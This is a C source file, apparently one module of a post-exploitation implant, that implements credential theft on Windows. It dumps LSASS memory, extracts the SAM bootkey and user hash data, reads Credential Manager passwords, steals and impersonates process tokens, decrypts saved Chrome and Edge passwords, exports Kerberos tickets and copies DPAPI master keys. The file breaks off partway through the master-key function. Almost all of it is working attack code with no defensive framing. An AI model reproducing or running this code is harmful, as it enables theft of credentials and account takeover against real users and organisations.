/**
 * credentials.c - Credential Access Modules
 */
#include <windows.h>
#include <wincred.h>
#include <wincrypt.h>
#include <sddl.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <ntsecapi.h>
#include "../../include/postex.h"
#include "../../include/base64.h"
#include "../../include/evasion.h"

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "secur32.lib")

/* MiniDump callback types (avoid dbghelp.h link dependency) */
typedef enum _MINIDUMP_CALLBACK_TYPE {
    ModuleCallback = 0,
    ThreadCallback = 1,
    ThreadExCallback = 2,
    IncludeThreadCallback = 3,
    IncludeModuleCallback = 4,
    MemoryCallback = 5,
    CancelCallback = 6,
    WriteKernelMinidumpCallback = 7,
    KernelMinidumpStatusCallback = 8,
    RemoveMemoryCallback = 9,
    IncludeVmRegionCallback = 10,
    IoStartCallback = 11,
    IoWriteAllCallback = 12,
    IoFinishCallback = 13,
    ReadMemoryFailureCallback = 14,
    SecondaryFlagsCallback = 15,
    IsProcessSnapshotCallback = 16,
    VmStartCallback = 17,
    VmQueryCallback = 18,
    VmPreReadCallback = 19,
    VmPostReadCallback = 20
} MINIDUMP_CALLBACK_TYPE;

typedef struct _MINIDUMP_IO_CALLBACK {
    HANDLE  Handle;
    ULONG64 Offset;
    PVOID   Buffer;
    ULONG   BufferBytes;
} MINIDUMP_IO_CALLBACK, *PMINIDUMP_IO_CALLBACK;

typedef struct _MINIDUMP_CALLBACK_INPUT {
    ULONG ProcessId;
    HANDLE ProcessHandle;
    ULONG CallbackType;
    union {
        MINIDUMP_IO_CALLBACK Io;
    };
} MINIDUMP_CALLBACK_INPUT, *PMINIDUMP_CALLBACK_INPUT;

typedef struct _MINIDUMP_CALLBACK_OUTPUT {
    union {
        ULONG Status;
        struct {
            HANDLE Handle;
            PVOID  Buffer;
            ULONG  BufferBytes;
        } Io;
    };
} MINIDUMP_CALLBACK_OUTPUT, *PMINIDUMP_CALLBACK_OUTPUT;

typedef struct _MINIDUMP_CALLBACK_INFORMATION {
    BOOL (WINAPI *CallbackRoutine)(PVOID CallbackParam,
                                   PMINIDUMP_CALLBACK_INPUT CallbackInput,
                                   PMINIDUMP_CALLBACK_OUTPUT CallbackOutput);
    PVOID CallbackParam;
} MINIDUMP_CALLBACK_INFORMATION, *PMINIDUMP_CALLBACK_INFORMATION;

typedef struct {
    BYTE *buffer;
    SIZE_T size;
    SIZE_T capacity;
} MemDumpCtx;

static BOOL WINAPI MiniDumpCallback(PVOID CallbackParam,
                                    PMINIDUMP_CALLBACK_INPUT CallbackInput,
                                    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
    MemDumpCtx *ctx = (MemDumpCtx *)CallbackParam;

    if (!CallbackInput || !CallbackOutput || !ctx)
        return FALSE;

    switch (CallbackInput->CallbackType) {
    case IoStartCallback:
        CallbackOutput->Status = S_FALSE;
        break;
    case IoWriteAllCallback: {
        SIZE_T needed = (SIZE_T)(CallbackInput->Io.Offset + CallbackInput->Io.BufferBytes);
        if (needed > ctx->capacity) {
            SIZE_T new_cap = needed * 2;
            if (new_cap < 50 * 1024 * 1024)
                new_cap = 50 * 1024 * 1024;
            BYTE *new_buf = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, ctx->buffer, new_cap);
            if (!new_buf) {
                CallbackOutput->Status = S_FALSE;
                return TRUE;
            }
            ctx->buffer = new_buf;
            ctx->capacity = new_cap;
        }
        CopyMemory(ctx->buffer + (SIZE_T)CallbackInput->Io.Offset,
                   CallbackInput->Io.Buffer, CallbackInput->Io.BufferBytes);
        if (needed > ctx->size)
            ctx->size = needed;
        CallbackOutput->Status = S_OK;
        break;
    }
    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        break;
    default:
        break;
    }
    return TRUE;
}

#ifndef KERBEROS_PACKAGE_NAME
#define KERBEROS_PACKAGE_NAME L"Kerberos"
#endif

#ifndef KerbQueryTicketCacheEx2Message
#define KerbQueryTicketCacheEx2Message 14
#endif

#ifndef KerbRetrieveEncodedTicketMessage
#define KerbRetrieveEncodedTicketMessage 10
#endif

static DWORD append_fmt(PBYTE buf, DWORD offset, DWORD buf_size, const char *fmt, ...) {
    if (!buf || offset >= buf_size) return offset;
    va_list args;
    va_start(args, fmt);
    int written = _vsnprintf((char *)(buf + offset), buf_size - offset, fmt, args);
    va_end(args);
    if (written <= 0) return offset;
    if ((DWORD)written >= buf_size - offset) return buf_size;
    return offset + (DWORD)written;
}

static BOOL read_file_bytes(const char *path, PBYTE *out, DWORD *out_size) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) {
        CloseHandle(h);
        return FALSE;
    }
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!buf) {
        CloseHandle(h);
        return FALSE;
    }
    DWORD rd = 0;
    if (!ReadFile(h, buf, sz, &rd, NULL) || rd != sz) {
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(h);
        return FALSE;
    }
    CloseHandle(h);
    *out = buf;
    *out_size = sz;
    return TRUE;
}

static DWORD find_process_pid(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

BOOL cred_dump_lsass(PBYTE *output, PDWORD output_size) {
    DWORD pid = find_process_pid("lsass.exe");
    if (!pid) return FALSE;

    enable_privilege(L"SeDebugPrivilege");

    HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hLsass) return FALSE;

    typedef BOOL (WINAPI *MiniDumpWriteDumpFn)(HANDLE, DWORD, HANDLE, DWORD, PVOID, PVOID, PVOID);
    HMODULE hDbg = LoadLibraryA("dbghelp.dll");
    if (!hDbg) {
        CloseHandle(hLsass);
        return FALSE;
    }

    MiniDumpWriteDumpFn pDump = (MiniDumpWriteDumpFn)GetProcAddress(hDbg, "MiniDumpWriteDump");
    if (!pDump) {
        FreeLibrary(hDbg);
        CloseHandle(hLsass);
        return FALSE;
    }

    MemDumpCtx ctx = {0};
    ctx.capacity = 50 * 1024 * 1024;
    ctx.buffer = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ctx.capacity);
    if (!ctx.buffer) {
        FreeLibrary(hDbg);
        CloseHandle(hLsass);
        return FALSE;
    }

    MINIDUMP_CALLBACK_INFORMATION mci = {0};
    mci.CallbackRoutine = MiniDumpCallback;
    mci.CallbackParam = &ctx;

    BOOL ok = pDump(hLsass, pid, NULL, 2 /* MiniDumpWithFullMemory */, NULL, NULL, &mci);
    CloseHandle(hLsass);
    FreeLibrary(hDbg);

    if (!ok || !ctx.buffer || ctx.size == 0) {
        if (ctx.buffer) HeapFree(GetProcessHeap(), 0, ctx.buffer);
        return FALSE;
    }

    *output = ctx.buffer;
    *output_size = (DWORD)ctx.size;
    return TRUE;
}

static void sam_permute_bootkey(BYTE out[16], const BYTE scrambled[16]) {
    static const int p[] = {8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7};
    int i;
    for (i = 0; i < 16; i++)
        out[i] = scrambled[p[i]];
}

static BOOL sam_read_bootkey(char bootkey_hex[33]) {
    static const char *keys[] = {"JD", "Skew1", "GBG", "Data"};
    BYTE scrambled[16] = {0};
    int k;

    for (k = 0; k < 4; k++) {
        HKEY hClass = NULL;
        char path[128];
        char cls[64] = {0};
        DWORD cls_sz = sizeof(cls);
        int i;

        _snprintf(path, sizeof(path), "SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s", keys[k]);
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hClass) != ERROR_SUCCESS)
            return FALSE;
        if (RegQueryValueExA(hClass, "Class", NULL, NULL, (LPBYTE)cls, &cls_sz) != ERROR_SUCCESS) {
            RegCloseKey(hClass);
            return FALSE;
        }
        RegCloseKey(hClass);

        for (i = 0; i < 4 && cls[i * 2] && cls[i * 2 + 1]; i++) {
            char byte_str[3] = {cls[i * 2], cls[i * 2 + 1], 0};
            scrambled[k * 4 + i] = (BYTE)strtoul(byte_str, NULL, 16);
        }
    }

    {
        BYTE bootkey[16];
        sam_permute_bootkey(bootkey, scrambled);
        for (k = 0; k < 16; k++)
            _snprintf(bootkey_hex + k * 2, 3, "%02x", bootkey[k]);
        bootkey_hex[32] = '\0';
    }
    return TRUE;
}

static DWORD sam_append_reg_value(PBYTE buf, DWORD offset, DWORD buf_size,
                                  HKEY hKey, const char *name) {
    DWORD type = 0, data_sz = 0;
    LONG st;

    st = RegQueryValueExA(hKey, name, NULL, &type, NULL, &data_sz);
    if (st != ERROR_SUCCESS || data_sz == 0)
        return offset;

    if (offset + data_sz + 128 >= buf_size)
        return offset;

    offset = append_fmt(buf, offset, buf_size, "  %s (%lu bytes): ", name, (unsigned long)data_sz);
    {
        PBYTE data = (PBYTE)HeapAlloc(GetProcessHeap(), 0, data_sz);
        if (data) {
            if (RegQueryValueExA(hKey, name, NULL, &type, data, &data_sz) == ERROR_SUCCESS) {
                char b64[8192];
                DWORD b64_len = b64_encode(data, data_sz, b64, sizeof(b64));
                if (b64_len > 0)
                    offset = append_fmt(buf, offset, buf_size, "b64=%s\n", b64);
                else
                    offset = append_fmt(buf, offset, buf_size, "(encode failed)\n");
            }
            HeapFree(GetProcessHeap(), 0, data);
        }
    }
    return offset;
}

BOOL cred_dump_sam(PBYTE *output, PDWORD output_size) {
    enable_privilege(L"SeBackupPrivilege");
    enable_privilege(L"SeRestorePrivilege");

    DWORD buf_size = 256 * 1024;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    if (!buf)
        return FALSE;

    DWORD off = 0;
    char bootkey_hex[33] = {0};
    BOOL any = FALSE;

    off = append_fmt(buf, off, buf_size, "=== SAM dump: in-memory read (no RegSaveKey) ===\n");

    if (sam_read_bootkey(bootkey_hex)) {
        off = append_fmt(buf, off, buf_size, "BootKey: %s\n", bootkey_hex);
        any = TRUE;
    }

    {
        HKEY hUsers = NULL;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users", 0,
                          KEY_READ, &hUsers) == ERROR_SUCCESS) {
            DWORD idx = 0;
            char subname[64];
            DWORD subname_len;
            FILETIME ft;

            off = append_fmt(buf, off, buf_size, "=== SAM Users ===\n");
            while (off < buf_size - 4096) {
                subname_len = sizeof(subname);
                if (RegEnumKeyExA(hUsers, idx++, subname, &subname_len, NULL, NULL, NULL, &ft) != ERROR_SUCCESS)
                    break;
                if (subname[0] == 'N' && subname[1] == 'a' && subname[2] == 'm' && subname[3] == 'e')
                    continue;
                if (lstrcmpA(subname, "Names") == 0)
                    continue;

                off = append_fmt(buf, off, buf_size, "RID: %s\n", subname);
                {
                    HKEY hRid = NULL;
                    char rid_path[128];
                    _snprintf(rid_path, sizeof(rid_path),
                              "SAM\\SAM\\Domains\\Account\\Users\\%s", subname);
                    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, rid_path, 0, KEY_READ, &hRid) == ERROR_SUCCESS) {
                        off = sam_append_reg_value(buf, off, buf_size, hRid, "V");
                        off = sam_append_reg_value(buf, off, buf_size, hRid, "F");
                        RegCloseKey(hRid);
                        any = TRUE;
                    }
                }
            }
            RegCloseKey(hUsers);
        }
    }

    {
        HKEY hSec = NULL;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets", 0,
                          KEY_READ, &hSec) == ERROR_SUCCESS) {
            off = append_fmt(buf, off, buf_size, "=== SECURITY Policy\\Secrets (metadata) ===\n");
            RegCloseKey(hSec);
            any = TRUE;
        }
    }

    if (!any || off <= 64) {
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }

    *output = buf;
    *output_size = off;
    return TRUE;
}

BOOL cred_dump_credman(PBYTE *output, PDWORD output_size) {
    PCREDENTIALW *creds = NULL;
    DWORD count = 0;
    if (!CredEnumerateW(NULL, 0, &count, &creds)) return FALSE;

    DWORD buf_size = count * 512 + 256;
    if (buf_size < 4096) buf_size = 4096;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    if (!buf) {
        CredFree(creds);
        return FALSE;
    }
    DWORD offset = 0;

    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALW cred = creds[i];
        char target[256] = {0}, username[256] = {0};
        WideCharToMultiByte(CP_UTF8, 0, cred->TargetName, -1, target, sizeof(target), NULL, NULL);
        if (cred->UserName)
            WideCharToMultiByte(CP_UTF8, 0, cred->UserName, -1, username, sizeof(username), NULL, NULL);

        offset = append_fmt(buf, offset, buf_size,
            "[%u] Target: %s | User: %s | Type: %u | BlobSize: %u\n",
            i, target, username, cred->Type, cred->CredentialBlobSize);

        if (cred->Type == CRED_TYPE_GENERIC && cred->CredentialBlob && cred->CredentialBlobSize > 0) {
            offset = append_fmt(buf, offset, buf_size, "    Password: ");
            DWORD copy_size = min(cred->CredentialBlobSize, buf_size - offset - 2);
            if (copy_size > 256) copy_size = 256;
            if (copy_size > 0) {
                CopyMemory(buf + offset, cred->CredentialBlob, copy_size);
                offset += copy_size;
            }
            if (offset < buf_size - 1) buf[offset++] = '\n';
        }
        if (offset >= buf_size - 128) break;
    }

    CredFree(creds);
    *output = buf;
    *output_size = offset;
    return offset > 0;
}

BOOL cred_steal_token(DWORD pid, PHANDLE out_token) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return FALSE;

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hToken)) {
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);
    *out_token = hDupToken;
    return TRUE;
}

BOOL cred_impersonate_token(HANDLE token) {
    return ImpersonateLoggedOnUser(token);
}

BOOL cred_revert_to_self(void) {
    return RevertToSelf();
}

static BOOL chrome_aes_gcm_decrypt(const BYTE *key, DWORD key_len,
                                   const BYTE *blob, DWORD blob_len,
                                   BYTE *out, DWORD *out_len) {
    if (blob_len < 3 + 12 + 16) return FALSE;
    if (blob[0] != 'v' || blob[1] != '1') return FALSE;

    const BYTE *nonce = blob + 3;
    const BYTE *ct = blob + 3 + 12;
    DWORD ct_len = blob_len - 3 - 12 - 16;
    const BYTE *tag = blob + blob_len - 16;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE *key_obj = NULL;
    BOOL ok = FALSE;
    BYTE tag_copy[16];
    CopyMemory(tag_copy, tag, 16);

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
        return FALSE;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          (ULONG)sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0)
        goto done;

    DWORD cb_obj = 0, cb_data = 0;
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cb_obj,
                          sizeof(cb_obj), &cb_data, 0) != 0)
        goto done;

    key_obj = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb_obj);
    if (!key_obj) goto done;

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, key_obj, cb_obj,
                                   (PUCHAR)key, key_len, 0) != 0)
        goto done;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
    BCRYPT_INIT_AUTH_MODE_INFO(auth);
    auth.pbNonce = (PUCHAR)nonce;
    auth.cbNonce = 12;
    auth.pbTag = tag_copy;
    auth.cbTag = 16;

    DWORD pt_len = 0;
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &auth, NULL, 0,
                      out, ct_len, &pt_len, 0) == 0) {
        *out_len = pt_len;
        ok = TRUE;
    }

done:
    if (hKey) BCryptDestroyKey(hKey);
    if (key_obj) HeapFree(GetProcessHeap(), 0, key_obj);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

static BOOL get_chrome_master_key(const char *local_state_path, BYTE *key_out, DWORD *key_len) {
    PBYTE data = NULL;
    DWORD data_sz = 0;
    if (!read_file_bytes(local_state_path, &data, &data_sz)) return FALSE;

    char *json = (char *)data;
    const char *needle = "\"encrypted_key\":\"";
    char *p = strstr(json, needle);
    if (!p) {
        HeapFree(GetProcessHeap(), 0, data);
        return FALSE;
    }
    p += lstrlenA(needle);
    char b64[4096] = {0};
    int i = 0;
    while (*p && *p != '"' && i < (int)sizeof(b64) - 1)
        b64[i++] = *p++;

    BYTE enc_key[4096];
    DWORD enc_len = b64_decode(b64, (DWORD)i, enc_key, sizeof(enc_key));
    HeapFree(GetProcessHeap(), 0, data);
    if (enc_len <= 5) return FALSE;

    DATA_BLOB in, out;
    in.pbData = enc_key + 5;
    in.cbData = enc_len - 5;
    out.pbData = NULL;
    out.cbData = 0;
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
        return FALSE;

    if (out.cbData > *key_len) {
        LocalFree(out.pbData);
        return FALSE;
    }
    CopyMemory(key_out, out.pbData, out.cbData);
    *key_len = out.cbData;
    LocalFree(out.pbData);
    return TRUE;
}

typedef int (*sqlite3_open_t)(const char *, void **);
typedef int (*sqlite3_prepare_v2_t)(void *, const char *, int, void **, const char **);
typedef int (*sqlite3_step_t)(void *);
typedef int (*sqlite3_finalize_t)(void *);
typedef int (*sqlite3_close_t)(void *);
typedef const unsigned char *(*sqlite3_column_text_t)(void *, int);
typedef const void *(*sqlite3_column_blob_t)(void *, int);
typedef int (*sqlite3_column_bytes_t)(void *, int);

static BOOL cred_dump_browser_profile(const char *login_db, const char *local_state,
                                      const char *label, PBYTE buf, DWORD *offset, DWORD buf_size) {
    char temp_db[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_db);
    _snprintf(temp_db + lstrlenA(temp_db), MAX_PATH - lstrlenA(temp_db),
              "%s_login_%lu.db", label, (unsigned long)GetTickCount());

    if (!CopyFileA(login_db, temp_db, FALSE)) return FALSE;

    BYTE aes_key[32];
    DWORD aes_key_len = sizeof(aes_key);
    if (!get_chrome_master_key(local_state, aes_key, &aes_key_len)) {
        DeleteFileA(temp_db);
        return FALSE;
    }

    HMODULE hSql = LoadLibraryA("winsqlite3.dll");
    if (!hSql) hSql = LoadLibraryA("sqlite3.dll");
    if (!hSql) {
        DeleteFileA(temp_db);
        return FALSE;
    }

    sqlite3_open_t p_open = (sqlite3_open_t)GetProcAddress(hSql, "sqlite3_open");
    sqlite3_prepare_v2_t p_prep = (sqlite3_prepare_v2_t)GetProcAddress(hSql, "sqlite3_prepare_v2");
    sqlite3_step_t p_step = (sqlite3_step_t)GetProcAddress(hSql, "sqlite3_step");
    sqlite3_finalize_t p_fin = (sqlite3_finalize_t)GetProcAddress(hSql, "sqlite3_finalize");
    sqlite3_close_t p_close = (sqlite3_close_t)GetProcAddress(hSql, "sqlite3_close");
    sqlite3_column_text_t p_text = (sqlite3_column_text_t)GetProcAddress(hSql, "sqlite3_column_text");
    sqlite3_column_blob_t p_blob = (sqlite3_column_blob_t)GetProcAddress(hSql, "sqlite3_column_blob");
    sqlite3_column_bytes_t p_bytes = (sqlite3_column_bytes_t)GetProcAddress(hSql, "sqlite3_column_bytes");

    if (!p_open || !p_prep || !p_step || !p_fin || !p_close ||
        !p_text || !p_blob || !p_bytes) {
        FreeLibrary(hSql);
        DeleteFileA(temp_db);
        return FALSE;
    }

    void *db = NULL;
    if (p_open(temp_db, &db) != 0 || !db) {
        FreeLibrary(hSql);
        DeleteFileA(temp_db);
        return FALSE;
    }

    void *stmt = NULL;
    const char *sql = "SELECT origin_url, username_value, password_value, encrypted_value FROM logins";
    BOOL any = FALSE;

    if (p_prep(db, sql, -1, &stmt, NULL) == 0 && stmt) {
        while (p_step(stmt) == 100) {
            const char *url = (const char *)p_text(stmt, 0);
            const char *user = (const char *)p_text(stmt, 1);
            const void *enc = p_blob(stmt, 3);
            int enc_len = p_bytes(stmt, 3);
            if (!url) url = "";
            if (!user) user = "";

            char pwd[512] = {0};
            if (enc && enc_len > 0) {
                if (enc_len >= 3 && ((const BYTE *)enc)[0] == 'v') {
                    BYTE plain[512];
                    DWORD plain_len = 0;
                    if (chrome_aes_gcm_decrypt(aes_key, aes_key_len,
                                               (const BYTE *)enc, (DWORD)enc_len,
                                               plain, &plain_len) && plain_len < sizeof(pwd) - 1) {
                        CopyMemory(pwd, plain, plain_len);
                        pwd[plain_len] = 0;
                    }
                } else {
                    DATA_BLOB in, out;
                    in.pbData = (BYTE *)enc;
                    in.cbData = (DWORD)enc_len;
                    out.pbData = NULL;
                    out.cbData = 0;
                    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                        if (out.cbData < sizeof(pwd) - 1) {
                            CopyMemory(pwd, out.pbData, out.cbData);
                            pwd[out.cbData] = 0;
                        }
                        LocalFree(out.pbData);
                    }
                }
            }

            if (pwd[0]) {
                *offset = append_fmt(buf, *offset, buf_size, "%s:%s@%s\n", user, pwd, url);
                any = TRUE;
            }
            if (*offset >= buf_size - 256) break;
        }
        p_fin(stmt);
    }

    p_close(db);
    FreeLibrary(hSql);
    DeleteFileA(temp_db);
    return any;
}

BOOL cred_dump_browser_dpapi(PBYTE *output, PDWORD output_size) {
    char localAppData[MAX_PATH];
    if (!GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH))
        return FALSE;

    DWORD buf_size = 65536;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    if (!buf) return FALSE;
    DWORD offset = 0;
    BOOL any = FALSE;

    struct { const char *label; const char *vendor; } profiles[] = {
        {"chrome", "Google\\Chrome\\User Data\\Default"},
        {"edge",   "Microsoft\\Edge\\User Data\\Default"},
    };

    for (int i = 0; i < 2; i++) {
        char login[MAX_PATH], state[MAX_PATH];
        _snprintf(login, sizeof(login), "%s\\%s\\Login Data", localAppData, profiles[i].vendor);
        _snprintf(state, sizeof(state), "%s\\%s\\Local State",
                  localAppData, profiles[i].vendor);

        if (GetFileAttributesA(login) == INVALID_FILE_ATTRIBUTES)
            continue;

        offset = append_fmt(buf, offset, buf_size, "[%s]\n", profiles[i].label);
        if (cred_dump_browser_profile(login, state, profiles[i].label, buf, &offset, buf_size))
            any = TRUE;
    }

    if (!any) {
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }

    *output = buf;
    *output_size = offset;
    return TRUE;
}

BOOL cred_dump_chrome(PBYTE *output, PDWORD output_size) {
    return cred_dump_browser_dpapi(output, output_size);
}

static void unicode_string_to_utf8(const UNICODE_STRING *us, char *out, size_t out_sz) {
    if (!out || out_sz == 0) return;
    out[0] = '\0';
    if (!us || !us->Buffer || us->Length == 0) return;
    WideCharToMultiByte(CP_UTF8, 0, us->Buffer, us->Length / sizeof(WCHAR),
                        out, (int)out_sz, NULL, NULL);
}

#ifndef KerbQueryTicketCacheMessage
#define KerbQueryTicketCacheMessage 1
#endif

BOOL cred_dump_tickets(PBYTE *output, PDWORD output_size) {
    HANDLE lsa = NULL;
    if (LsaConnectUntrusted(&lsa) != 0) return FALSE;

    LSA_STRING pkg_name;
    char kerb_pkg[] = "Kerberos";
    pkg_name.Buffer = kerb_pkg;
    pkg_name.Length = (USHORT)lstrlenA(kerb_pkg);
    pkg_name.MaximumLength = (USHORT)(pkg_name.Length + 1);

    ULONG auth_pkg = 0;
    if (LsaLookupAuthenticationPackage(lsa, &pkg_name, &auth_pkg) != 0) {
        LsaDeregisterLogonProcess(lsa);
        return FALSE;
    }

    DWORD buf_size = 65536;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    if (!buf) {
        LsaDeregisterLogonProcess(lsa);
        return FALSE;
    }
    DWORD offset = 0;

    KERB_QUERY_TKT_CACHE_REQUEST query;
    ZeroMemory(&query, sizeof(query));
    query.MessageType = KerbQueryTicketCacheMessage;
    query.LogonId.LowPart = 0;
    query.LogonId.HighPart = 0;

    PVOID resp = NULL;
    ULONG resp_len = 0;
    NTSTATUS st = LsaCallAuthenticationPackage(lsa, auth_pkg, &query,
                                               sizeof(query), &resp, &resp_len, NULL);
    if (st != 0 || !resp) {
        HeapFree(GetProcessHeap(), 0, buf);
        LsaDeregisterLogonProcess(lsa);
        return FALSE;
    }

    PKERB_QUERY_TKT_CACHE_RESPONSE cache = (PKERB_QUERY_TKT_CACHE_RESPONSE)resp;
    offset = append_fmt(buf, offset, buf_size, "Tickets: %lu\n",
                        (unsigned long)cache->CountOfTickets);

    for (ULONG i = 0; i < cache->CountOfTickets && offset < buf_size - 4096; i++) {
        KERB_TICKET_CACHE_INFO *tkt = &cache->Tickets[i];
        char server[256] = {0}, realm[256] = {0};
        unicode_string_to_utf8(&tkt->ServerName, server, sizeof(server));
        unicode_string_to_utf8(&tkt->RealmName, realm, sizeof(realm));

        offset = append_fmt(buf, offset, buf_size, "[%lu] %s @ %s\n",
                            (unsigned long)i, server, realm);

        KERB_RETRIEVE_TKT_REQUEST retrieve;
        ZeroMemory(&retrieve, sizeof(retrieve));
        retrieve.MessageType = KerbRetrieveEncodedTicketMessage;
        retrieve.LogonId = query.LogonId;
        retrieve.TicketFlags = 0;
        retrieve.CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
        retrieve.EncryptionType = 0;
        retrieve.TargetName = tkt->ServerName;

        PVOID tkt_resp = NULL;
        ULONG tkt_resp_len = 0;
        if (LsaCallAuthenticationPackage(lsa, auth_pkg, &retrieve,
                                         sizeof(retrieve), &tkt_resp, &tkt_resp_len, NULL) == 0 &&
            tkt_resp) {
            PKERB_RETRIEVE_TKT_RESPONSE tkt_data = (PKERB_RETRIEVE_TKT_RESPONSE)tkt_resp;
            if (tkt_data->Ticket.EncodedTicketSize > 0) {
                char b64[8192];
                DWORD b64_len = b64_encode(tkt_data->Ticket.EncodedTicket,
                                             tkt_data->Ticket.EncodedTicketSize,
                                             b64, sizeof(b64));
                if (b64_len > 0)
                    offset = append_fmt(buf, offset, buf_size, "  kirbi_b64: %s\n", b64);
            }
            LsaFreeReturnBuffer(tkt_resp);
        }
    }

    LsaFreeReturnBuffer(resp);
    LsaDeregisterLogonProcess(lsa);

    if (offset == 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }

    *output = buf;
    *output_size = offset;
    return TRUE;
}

BOOL cred_dump_dpapi_masterkeys(PBYTE *output, PDWORD output_size) {
    char path[MAX_PATH], appData[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appData, MAX_PATH) == 0) return FALSE;
    _snprintf(path, sizeof(path), "%s\\Microsoft\\Protect", appData);

    DWORD buf_size = 65536;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    if (!buf) return FALSE;
    DWORD offset = 0;

    WIN32_FIND_DATAA fd;
    char search[MAX_PATH];
    _snprintf(search, sizeof(search), "%s\\*", path);
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (fd.cFileName[0] == '.') continue;

            char sid_dir[MAX_PATH];
            _snprintf(sid_dir, sizeof(sid_dir), "%s\\%s", path, fd.cFileName);
            offset = append_fmt(buf, offset, buf_size,
                "SID Container: %s\n", sid_dir);
            if (offset >= buf_size - 4096) break;

            char key_search[MAX_PATH];
            _snprintf(key_search, sizeof(key_search), "%s\\*", sid_dir);
            WIN32_FIND_DATAA kfd;
            HANDLE hKeyFind = FindFirstFileA(key_search, &kfd);
            if (hKeyFind == INVALID_HANDLE_VALUE) continue;

            do {
                if (kfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                if (kfd.cFileName[0] == '.') continue;

                char key_path[MAX_PATH];
                _snprintf(key_path, sizeof(key_path), "%s\\%s", sid_dir, kfd.cFileName);

                PBYTE key_data = NULL;
                DWORD key_sz = 0;
                if (!read_file_bytes(key_path, &key_data, &key_sz)) continue;

                offset = append_fmt(buf, offset, buf_size,
                    "  MasterKey: %s (%lu bytes)\n", kfd.cFileName, (unsigned long)key_sz);
                if (key_data && key_sz > 0 && offset + key_sz + 64 < buf_size) {
                    offset = append_fmt(buf, offset, buf_size, "  Data: ");
                    DWORD copy = key_sz;
                    if (copy > buf_size - offset - 2) copy = buf_size - offset - 2;
                    if (copy > 0) {
                        CopyMemory(buf + offset, key_data, copy);
                        offset += copy;
                    }
